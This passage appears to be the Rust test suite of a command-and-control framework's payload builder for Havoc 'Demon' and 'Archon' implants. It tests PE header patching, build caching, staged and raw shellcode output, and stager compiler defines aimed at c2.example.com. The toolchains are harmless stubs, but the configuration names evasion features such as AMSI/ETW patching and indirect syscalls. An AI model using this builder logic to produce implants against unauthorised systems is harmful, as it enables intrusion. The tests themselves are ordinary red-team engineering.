                    compile_time: Some("0x12345678".to_owned()),
                    image_size_x64: Some(0x2000),
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )?;

        let pe_offset = 0x80;
        assert_eq!(&patched[..2], b"MZ");
        assert_eq!(
            u32::from_le_bytes(patched[pe_offset + 8..pe_offset + 12].try_into()?),
            0x1234_5678
        );
        let optional_header_offset = pe_offset + 24;
        assert_eq!(
            u32::from_le_bytes(
                patched[optional_header_offset + 56..optional_header_offset + 60].try_into()?
            ),
            0x2000
        );
        Ok(())
    }

    #[test]
    fn patch_payload_rejects_invalid_compile_time() {
        let error = patch_payload(
            sample_pe_payload(),
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: None,
                    magic_mz_x86: None,
                    compile_time: Some("not-a-number".to_owned()),
                    image_size_x64: None,
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )
        .expect_err("invalid compile time should fail");

        assert!(matches!(error, PayloadBuildError::InvalidRequest { .. }));
    }

    #[test]
    fn patch_payload_rejects_truncated_pe_header() {
        let error = patch_payload(
            vec![0_u8; 8],
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: None,
                    magic_mz_x86: None,
                    compile_time: Some("1".to_owned()),
                    image_size_x64: None,
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )
        .expect_err("truncated pe should fail");

        assert!(matches!(error, PayloadBuildError::InvalidRequest { .. }));
    }

    #[test]
    fn patch_payload_rejects_non_mz_magic() {
        // ELF magic — a non-PE binary that a failed cross-compile might produce.
        let mut elf_bytes = vec![0_u8; 0x80 + 24 + 60];
        elf_bytes[..4].copy_from_slice(&[0x7F, b'E', b'L', b'F']);
        let error = patch_payload(
            elf_bytes,
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: None,
                    magic_mz_x86: None,
                    compile_time: Some("1".to_owned()),
                    image_size_x64: None,
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )
        .expect_err("non-PE binary should be rejected");

        assert!(
            matches!(&error, PayloadBuildError::InvalidRequest { message }
                if message.contains("MZ magic")),
            "unexpected error: {error}"
        );
    }

    #[test]
    fn patch_payload_rejects_empty_binary() {
        let error = patch_payload(
            vec![],
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: None,
                    magic_mz_x86: None,
                    compile_time: Some("1".to_owned()),
                    image_size_x64: None,
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )
        .expect_err("empty binary should be rejected");

        assert!(matches!(error, PayloadBuildError::InvalidRequest { .. }));
    }

    #[test]
    fn patch_payload_rejects_invalid_pe_signature() {
        // MZ magic present but PE\0\0 signature is wrong.
        let mut bytes = vec![0_u8; 0x80 + 24 + 60];
        bytes[..2].copy_from_slice(b"MZ");
        bytes[0x3C..0x40].copy_from_slice(&(0x80_u32).to_le_bytes());
        bytes[0x80..0x84].copy_from_slice(b"NE\0\0"); // wrong signature
        let error = patch_payload(
            bytes,
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: None,
                    magic_mz_x86: None,
                    compile_time: Some("1".to_owned()),
                    image_size_x64: None,
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )
        .expect_err("invalid PE signature should be rejected");

        assert!(matches!(error, PayloadBuildError::InvalidRequest { .. }));
    }

    fn sample_pe_payload() -> Vec<u8> {
        let mut bytes = vec![0_u8; 0x80 + 24 + 60];
        bytes[..2].copy_from_slice(b"MZ");
        bytes[0x3C..0x40].copy_from_slice(&(0x80_u32).to_le_bytes());
        bytes[0x80..0x84].copy_from_slice(b"PE\0\0");
        bytes
    }

    /// Build a minimal source tree and return (service, listener, request).
    ///
    /// `nasm_script` and `gcc_script` are the shell script bodies written to the
    /// respective stub executables. Both must be `#!/bin/sh` scripts.
    fn setup_build_fixture(
        temp: &TempDir,
        nasm_script: &str,
        gcc_script: &str,
    ) -> Result<
        (PayloadBuilderService, ListenerConfig, BuildPayloadRequestInfo),
        Box<dyn std::error::Error>,
    > {
        let bin_dir = temp.path().join("bin");
        let cache_dir = temp.path().join("payload-cache");
        let source_root = temp.path().join("src/Havoc/payloads/Demon");
        let shellcode_root = temp.path().join("src/Havoc/payloads");
        std::fs::create_dir_all(&bin_dir)?;
        std::fs::create_dir_all(source_root.join("src/core"))?;
        std::fs::create_dir_all(source_root.join("src/crypt"))?;
        std::fs::create_dir_all(source_root.join("src/inject"))?;
        std::fs::create_dir_all(source_root.join("src/asm"))?;
        std::fs::create_dir_all(source_root.join("src/main"))?;
        std::fs::create_dir_all(source_root.join("include"))?;
        std::fs::create_dir_all(&shellcode_root)?;
        std::fs::write(source_root.join("src/core/a.c"), "int x = 1;")?;
        std::fs::write(source_root.join("src/asm/test.x64.asm"), "bits 64")?;
        std::fs::write(source_root.join("src/main/MainExe.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainSvc.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainDll.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/Demon.c"), "int demo = 1;")?;
        std::fs::write(shellcode_root.join("Shellcode.x64.bin"), [0x90_u8, 0x90])?;
        std::fs::write(shellcode_root.join("Shellcode.x86.bin"), [0x90_u8, 0x90])?;
        std::fs::write(shellcode_root.join("DllLdr.x64.bin"), [0x55_u8, 0x48])?;
        let templates_dir = temp.path().join("payloads/templates");
        std::fs::create_dir_all(&templates_dir)?;
        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;

        let nasm = bin_dir.join("nasm");
        let gcc = bin_dir.join("x86_64-w64-mingw32-gcc");
        std::fs::write(&nasm, nasm_script)?;
        std::fs::write(&gcc, gcc_script)?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&nasm, std::fs::Permissions::from_mode(0o755))?;
            std::fs::set_permissions(&gcc, std::fs::Permissions::from_mode(0o755))?;
        }

        let unknown_version =
            ToolchainVersion { major: 0, minor: 0, patch: 0, raw: "0.0.0".to_owned() };
        let service = PayloadBuilderService::with_paths_for_tests(
            Toolchain {
                compiler_x64: gcc.clone(),
                compiler_x64_version: unknown_version.clone(),
                compiler_x86: gcc,
                compiler_x86_version: unknown_version.clone(),
                nasm,
                nasm_version: unknown_version,
            },
            source_root,
            temp.path().join("agent/archon"),
            shellcode_root.join("Shellcode.x64.bin"),
            shellcode_root.join("Shellcode.x86.bin"),
            shellcode_root.join("DllLdr.x64.bin"),
            templates_dir.join("MainStager.c"),
            DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: true,
                allow_legacy_ctr: false,
            },
            None,
            cache_dir,
        );

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };

        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        Ok((service, listener, request))
    }

    #[tokio::test]
    async fn build_payload_compiler_exits_nonzero_returns_command_failed()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        // nasm succeeds and writes its output file; gcc always exits 1
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_fail = "#!/bin/sh\necho 'stub compiler error' >&2\nexit 1\n";
        let (service, listener, request) = setup_build_fixture(&temp, nasm_ok, gcc_fail)?;

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("a compiler that exits non-zero must produce an error");

        assert!(
            matches!(error, PayloadBuildError::CommandFailed { .. }),
            "expected CommandFailed, got {error:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_assembler_exits_nonzero_returns_command_failed()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        // nasm always exits 1; gcc is never reached
        let nasm_fail = "#!/bin/sh\necho 'stub assembler error' >&2\nexit 1\n";
        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'payload' > \"$1\"; break; fi; shift; done\n";
        let (service, listener, request) = setup_build_fixture(&temp, nasm_fail, gcc_ok)?;

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("an assembler that exits non-zero must produce an error");

        assert!(
            matches!(error, PayloadBuildError::CommandFailed { .. }),
            "expected CommandFailed, got {error:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_compiler_failure_populates_diagnostics()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        // Emit a structured GCC diagnostic to stderr then exit 1.
        let gcc_fail =
            "#!/bin/sh\necho \"src/Demon.c:42:8: error: 'foo' undeclared\" >&2\nexit 1\n";
        let (service, listener, request) = setup_build_fixture(&temp, nasm_ok, gcc_fail)?;

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("compiler failure must yield an error");

        match error {
            PayloadBuildError::CommandFailed { ref diagnostics, .. } => {
                assert_eq!(diagnostics.len(), 1, "one GCC diagnostic should be parsed");
                let d = &diagnostics[0];
                assert_eq!(d.filename, "src/Demon.c");
                assert_eq!(d.line, 42);
                assert_eq!(d.column, Some(8));
                assert_eq!(d.severity, "error");
                assert!(d.message.contains("'foo' undeclared"));
            }
            other => panic!("expected CommandFailed, got {other:?}"),
        }
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_returns_cached_artifact_on_second_request()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        // The compiler writes "payload" the first time; we can detect a cache
        // hit if the artifact is returned without re-invoking the compiler.
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'payload' > \"$1\"; break; fi; shift; done\n";
        let (service, listener, request) = setup_build_fixture(&temp, nasm_ok, gcc_ok)?;

        // First build — cache miss, runs the compiler.
        let first = service.build_payload(&listener, &request, |_| {}).await?;
        assert_eq!(first.bytes, b"payload");

        // Second build with identical inputs — cache hit, no recompilation.
        let mut hit_messages = Vec::new();
        let second = service
            .build_payload(&listener, &request, |m| hit_messages.push(m.message.clone()))
            .await?;
        assert_eq!(second.bytes, b"payload");
        assert!(
            hit_messages.iter().any(|m| m.contains("cache hit")),
            "expected a cache-hit progress message, got: {hit_messages:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_cache_miss_on_different_architecture()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        // Different architectures use different compilers but the important
        // thing is that they must not share a cache entry.
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'payload' > \"$1\"; break; fi; shift; done\n";
        let (service, listener, request_x64) = setup_build_fixture(&temp, nasm_ok, gcc_ok)?;
        let request_x86 = BuildPayloadRequestInfo { arch: "x86".to_owned(), ..request_x64.clone() };

        let first = service.build_payload(&listener, &request_x64, |_| {}).await?;
        assert_eq!(first.bytes, b"payload");

        // x86 build should NOT return the x64 cached artifact.
        let mut hit_messages = Vec::new();
        service
            .build_payload(&listener, &request_x86, |m| hit_messages.push(m.message.clone()))
            .await
            .ok(); // may fail due to stub compiler, but we just need to check messages
        assert!(
            !hit_messages.iter().any(|m| m.contains("cache hit")),
            "x86 build should not hit the x64 cache entry, got: {hit_messages:?}"
        );
        Ok(())
    }

    /// Regression test: Demon and Archon builds with identical listener/config/arch/format
    /// must not share a cache entry.  Before the fix, `compute_cache_key` omitted the agent
    /// variant from the hash, so the second build would return the first build's bytes.
    #[tokio::test]
    async fn build_payload_demon_and_archon_do_not_share_cache()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        // Compiler writes "demon-bytes" when building Demon and "archon-bytes" when building
        // Archon.  We detect a collision if the Archon request returns "demon-bytes".
        let gcc_demon = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'demon-bytes' > \"$1\"; break; fi; shift; done\n";

        let (service, listener, demon_request) = setup_build_fixture(&temp, nasm_ok, gcc_demon)?;

        // First build: Demon — cache miss, compiler writes "demon-bytes".
        let demon_artifact = service.build_payload(&listener, &demon_request, |_| {}).await?;
        assert_eq!(demon_artifact.bytes, b"demon-bytes");

        // Create a minimal Archon source tree so the existence check passes.
        let archon_root = temp.path().join("agent/archon");
        for dir in ["src/core", "src/crypt", "src/inject", "src/asm", "src/main", "include"] {
            std::fs::create_dir_all(archon_root.join(dir))?;
        }
        std::fs::write(archon_root.join("src/core/a.c"), "int x = 1;")?;
        std::fs::write(archon_root.join("src/asm/test.x64.asm"), "bits 64")?;
        std::fs::write(archon_root.join("src/main/MainExe.c"), "int main(void){return 0;}")?;
        std::fs::write(archon_root.join("src/main/MainSvc.c"), "int main(void){return 0;}")?;
        std::fs::write(archon_root.join("src/main/MainDll.c"), "int main(void){return 0;}")?;
        std::fs::write(archon_root.join("src/Demon.c"), "int demo = 1;")?;

        let archon_request =
            BuildPayloadRequestInfo { agent_type: "Archon".to_owned(), ..demon_request.clone() };

        // Second build: Archon with identical listener/config/arch/format.
        // The cache key must differ from Demon's, so we get a cache miss (full build).
        let mut hit_messages = Vec::new();
        // The build may succeed or fail depending on stub output — we only care about
        // whether a cache hit was reported.
        let _ = service
            .build_payload(&listener, &archon_request, |m| hit_messages.push(m.message.clone()))
            .await;

        assert!(
            !hit_messages.iter().any(|m| m.contains("cache hit")),
            "Archon build must not hit the Demon cache entry; messages: {hit_messages:?}"
        );
        Ok(())
    }

    // ──────────────────────────────────────────────────────────────────────
    // OutputFormat: new variants
    // ──────────────────────────────────────────────────────────────────────

    #[test]
    fn output_format_parses_staged_shellcode() {
        let fmt = OutputFormat::parse("Windows Shellcode Staged")
            .expect("should parse Windows Shellcode Staged");
        assert_eq!(fmt, OutputFormat::StagedShellcode);
        assert_eq!(fmt.file_extension(), ".exe");
    }

    #[test]
    fn output_format_parses_raw_shellcode() {
        let fmt = OutputFormat::parse("Windows Raw Shellcode")
            .expect("should parse Windows Raw Shellcode");
        assert_eq!(fmt, OutputFormat::RawShellcode);
        assert_eq!(fmt.file_extension(), ".bin");
    }

    #[test]
    fn output_format_parse_rejects_unknown_format() {
        let err = OutputFormat::parse("Windows Invalid Format")
            .expect_err("unknown format should be rejected");
        assert!(
            matches!(&err, PayloadBuildError::InvalidRequest { message }
                if message.contains("Windows Invalid Format")),
            "unexpected error: {err}"
        );
    }

    // ──────────────────────────────────────────────────────────────────────
    // build_payload: new formats (integration with fake toolchain)
    // ──────────────────────────────────────────────────────────────────────

    #[tokio::test]
    async fn build_payload_raw_shellcode_rejects_x86() -> Result<(), Box<dyn std::error::Error>> {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x86".to_owned(),
            format: "Windows Raw Shellcode".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        let err = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("x86 raw shellcode must be rejected");
        assert!(
            matches!(&err, PayloadBuildError::InvalidRequest { message }
                if message.contains("x64")),
            "unexpected error: {err}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_staged_shellcode_rejects_non_http()
    -> Result<(), Box<dyn std::error::Error>> {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "smb".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Shellcode Staged".to_owned(),
            config: "{}".to_owned(),
        };
        let listener = ListenerConfig::Smb(red_cell_common::SmbListenerConfig {
            name: "smb".to_owned(),
            pipe_name: "pivot".to_owned(),
            kill_date: None,
            working_hours: None,
        });

        let err = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("staged shellcode with SMB listener must be rejected");
        assert!(
            matches!(&err, PayloadBuildError::InvalidRequest { message }
                if message.contains("HTTP listener")),
            "unexpected error: {err}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_staged_shellcode_uses_stager_template()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager' > \"$1\"; break; fi; shift; done\necho gcc-stager-ok\n";
        let (service, listener, _) = setup_build_fixture(&temp, nasm_ok, gcc_ok)?;

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Shellcode Staged".to_owned(),
            config: "{}".to_owned(),
        };

        let mut messages = Vec::new();
        let artifact = service
            .build_payload(&listener, &request, |m| messages.push(m.message.clone()))
            .await?;

        assert_eq!(artifact.bytes, b"stager");
        assert_eq!(artifact.file_name, "demon.x64.exe");
        assert_eq!(artifact.format, "Windows Shellcode Staged");
        assert!(
            messages.iter().any(|m| m.contains("gcc-stager-ok")),
            "expected gcc output in messages: {messages:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_raw_shellcode_prepends_dllldr_template()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        // Compiler writes exactly "dll" as the output DLL bytes.
        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'dll' > \"$1\"; break; fi; shift; done\necho gcc-raw-ok\n";
        let (service, listener, _) = setup_build_fixture(&temp, nasm_ok, gcc_ok)?;

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Raw Shellcode".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };

        let artifact = service.build_payload(&listener, &request, |_| {}).await?;

        // DllLdr.x64.bin stub is [0x55, 0x48]; the fake gcc writes "dll".
        assert_eq!(&artifact.bytes[..2], &[0x55, 0x48], "DllLdr header not prepended");
        assert_eq!(&artifact.bytes[2..], b"dll", "DLL bytes not appended after DllLdr header");
        assert_eq!(artifact.file_name, "demon.x64.bin");
        assert_eq!(artifact.format, "Windows Raw Shellcode");
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_staged_shellcode_cache_hit_skips_compilation()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager' > \"$1\"; break; fi; shift; done\n";
        let (service, listener, _) = setup_build_fixture(&temp, nasm_ok, gcc_ok)?;

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Shellcode Staged".to_owned(),
            config: "{}".to_owned(),
        };

        // First build — compiles and caches.
        let first = service.build_payload(&listener, &request, |_| {}).await?;

        // Second build — must return cache hit.
        let mut messages = Vec::new();
        let second = service
            .build_payload(&listener, &request, |m| messages.push(m.message.clone()))
            .await?;

        assert_eq!(first.bytes, second.bytes, "cached bytes must match compiled bytes");
        assert!(
            messages.iter().any(|m| m.contains("cache hit")),
            "second request should be a cache hit: {messages:?}"
        );
        Ok(())
    }

    // ── Stager generation integration tests ────────────────────────────

    #[tokio::test]
    async fn build_stager_passes_correct_defines_to_compiler()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let args_file = temp.path().join("gcc.args");
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_ok = format!(
            "#!/bin/sh\nprintf '%s\\n' \"$@\" > '{}'\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager-exe' > \"$1\"; break; fi; shift; done\n",
            args_file.display()
        );
        let (service, _, _) = setup_build_fixture(&temp, nasm_ok, &gcc_ok)?;

        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http-staging".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["c2.example.com".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 8443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: vec!["/stage".to_owned()],
            host_header: None,
            secure: true,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http-staging".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Shellcode Staged".to_owned(),
            config: "{}".to_owned(),
        };

        let mut messages = Vec::new();
        let artifact = service
            .build_payload(&listener, &request, |m| messages.push(m.message.clone()))
            .await?;

        // Validate artifact metadata.
        assert_eq!(artifact.file_name, "demon.x64.exe");
        assert_eq!(artifact.format, "Windows Shellcode Staged");
        assert!(!artifact.bytes.is_empty(), "stager artifact must not be empty");

        // Validate that the correct -D defines were passed to the compiler.
        let gcc_args = std::fs::read_to_string(&args_file)?;
        assert!(
            gcc_args.contains("-DSTAGER_PORT=443"),
            "expected port_conn=443 in defines: {gcc_args}"
        );
        assert!(gcc_args.contains("-DSTAGER_SECURE=1"), "expected secure=1 in defines: {gcc_args}");
        // Host and URI are embedded as C byte-array initialisers.
        assert!(gcc_args.contains("-DSTAGER_HOST="), "expected STAGER_HOST define: {gcc_args}");
        assert!(gcc_args.contains("-DSTAGER_URI="), "expected STAGER_URI define: {gcc_args}");
        // Verify the entry point flag.
        assert!(
            gcc_args.contains("-e") && gcc_args.contains("WinMain"),
            "expected -e WinMain in args: {gcc_args}"
        );
        // Verify linking flags.
        assert!(gcc_args.contains("-lwininet"), "stager must link wininet: {gcc_args}");
        // Verify the stager template source was passed.
        assert!(gcc_args.contains("MainStager.c"), "stager must compile MainStager.c: {gcc_args}");

        // Validate progress messages include expected stages.
        assert!(
            messages.iter().any(|m| m.contains("starting stager build")),
            "expected 'starting stager build' in messages: {messages:?}"
        );
        assert!(
            messages.iter().any(|m| m.contains("payload generated")),
            "expected 'payload generated' in messages: {messages:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_stager_x86_uses_underscore_entry_point() -> Result<(), Box<dyn std::error::Error>>
    {
        let temp = TempDir::new()?;
        let bin_dir = temp.path().join("bin");
        let cache_dir = temp.path().join("payload-cache");
        let source_root = temp.path().join("src/Havoc/payloads/Demon");
        let shellcode_root = temp.path().join("src/Havoc/payloads");
        let gcc_x86_args = temp.path().join("gcc-x86.args");

        std::fs::create_dir_all(&bin_dir)?;
        std::fs::create_dir_all(source_root.join("src/core"))?;
        std::fs::create_dir_all(source_root.join("src/crypt"))?;
        std::fs::create_dir_all(source_root.join("src/inject"))?;
        std::fs::create_dir_all(source_root.join("src/asm"))?;
        std::fs::create_dir_all(source_root.join("src/main"))?;
        std::fs::create_dir_all(source_root.join("include"))?;
        std::fs::create_dir_all(&shellcode_root)?;
        std::fs::write(source_root.join("src/core/a.c"), "int x = 1;")?;
        std::fs::write(source_root.join("src/asm/test.x86.asm"), "bits 32")?;
        std::fs::write(source_root.join("src/main/MainExe.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainSvc.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainDll.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/Demon.c"), "int demo = 1;")?;
        std::fs::write(shellcode_root.join("Shellcode.x64.bin"), [0x90, 0x90])?;
        std::fs::write(shellcode_root.join("Shellcode.x86.bin"), [0x90, 0x90])?;
        std::fs::write(shellcode_root.join("DllLdr.x64.bin"), [0x55, 0x48])?;
        let templates_dir = temp.path().join("payloads/templates");
        std::fs::create_dir_all(&templates_dir)?;
        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;

        let nasm = bin_dir.join("nasm");
        let gcc_x64 = bin_dir.join("x86_64-w64-mingw32-gcc");
        let gcc_x86 = bin_dir.join("i686-w64-mingw32-gcc");
        std::fs::write(
            &nasm,
            "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n",
        )?;
        std::fs::write(
            &gcc_x64,
            "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager-x64' > \"$1\"; break; fi; shift; done\n",
        )?;
        std::fs::write(
            &gcc_x86,
            format!(
                "#!/bin/sh\nprintf '%s\\n' \"$@\" > '{}'\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager-x86' > \"$1\"; break; fi; shift; done\n",
                gcc_x86_args.display()
            ),
        )?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&nasm, std::fs::Permissions::from_mode(0o755))?;
            std::fs::set_permissions(&gcc_x64, std::fs::Permissions::from_mode(0o755))?;
            std::fs::set_permissions(&gcc_x86, std::fs::Permissions::from_mode(0o755))?;
        }

        let unknown_version =
            ToolchainVersion { major: 0, minor: 0, patch: 0, raw: "0.0.0".to_owned() };
        let service = PayloadBuilderService::with_paths_for_tests(
            Toolchain {
                compiler_x64: gcc_x64,
                compiler_x64_version: unknown_version.clone(),
                compiler_x86: gcc_x86,
                compiler_x86_version: unknown_version.clone(),
                nasm,
                nasm_version: unknown_version,
            },
            source_root,
            temp.path().join("agent/archon"),
            shellcode_root.join("Shellcode.x64.bin"),
            shellcode_root.join("Shellcode.x86.bin"),
            shellcode_root.join("DllLdr.x64.bin"),
            templates_dir.join("MainStager.c"),
